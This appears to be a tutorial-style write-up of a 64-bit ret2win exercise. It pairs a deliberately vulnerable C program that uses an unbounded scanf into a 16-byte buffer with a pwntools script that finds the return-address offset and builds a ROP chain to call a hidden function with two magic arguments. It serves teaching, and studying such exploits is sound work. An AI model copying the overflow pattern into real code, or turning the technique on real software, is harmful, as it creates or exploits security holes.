# Ret2Win with 64-bit Parameters Exploit

This is an advanced ret2win exploit with 64-bit parameters, where the buffer overflow is exploited to pass two specific 64-bit arguments to the hidden function `hacked()`.

## C Code (vulnerable_with_64_params.c)

```c
#include <stdio.h>

void hacked(long first, long second)
{
    if (first == 0xdeadbeefdeadbeef && second == 0xc0debabec0debabe){
        printf("This function is TOP SECRET! How did you get in here?! :O\n");
    }else{
        printf("Unauthorised access to secret function detected, authorities have been alerted!!\n");
    }
}

void register_name()
{
    char buffer[16];

    printf("Name:\n");
    scanf("%s", buffer);
    printf("Hi there, %s\n", buffer);
}

int main()
{
    register_name();

    return 0;
}
```

## Python Exploit Code (exploit_with_64_params.py)

```python
from pwn import *

# Allows easy swapping between local/remote/debug modes
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(b':', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './ret2win_params'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(200))

# Start program
io = start()

# ROP object
rop = ROP(elf)
rop.hacked(0xdeadbeefdeadbeef, 0xc0debabec0debabe)

# Build the payload
payload = flat({
    offset: rop.chain()
})

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter(b':', payload)

# Get flag
io.interactive()
```

## Explanation of the Code

### Vulnerable C Code with 64-bit Parameters

- This version of the `hacked()` function now takes two 64-bit parameters. The function checks if these values match `0xdeadbeefdeadbeef` and `0xc0debabec0debabe`.
- The `register_name()` function still contains the buffer overflow vulnerability, which allows us to overwrite the return address of the function.
- To successfully exploit this, we need to send two specific 64-bit values as parameters to the `hacked()` function during the exploit.

### Exploit Code with 64-bit Parameters

- **`find_ip()`**: This function sends a cyclic pattern to the program and finds the offset to the return address (RIP in x64). It helps identify how many bytes of input are required to overwrite the return address.
- **ROP Chain**: A Return-Oriented Programming (ROP) chain is created using Pwntools. We use `rop.hacked()` to directly call the `hacked()` function with the correct parameters `0xdeadbeefdeadbeef` and `0xc0debabec0debabe`.
- **Payload**: The payload is constructed by combining the offset and the ROP chain, which includes the return address and the parameters for the `hacked()` function.
- **`write('payload', payload)`**: This writes the payload to a file called `payload`, which can be saved for later reference.

### Running the Exploit

1. **Run the exploit**:

```bash
   python3 exploit_with_64_params.py
```

### Output

When the exploit is successful, the `hacked()` function will be triggered with the correct 64-bit parameters, and the following message will be printed:

```
This function is TOP SECRET! How did you get in here?! :O
```

The exploit also saves the payload to a file named `payload` for reference.
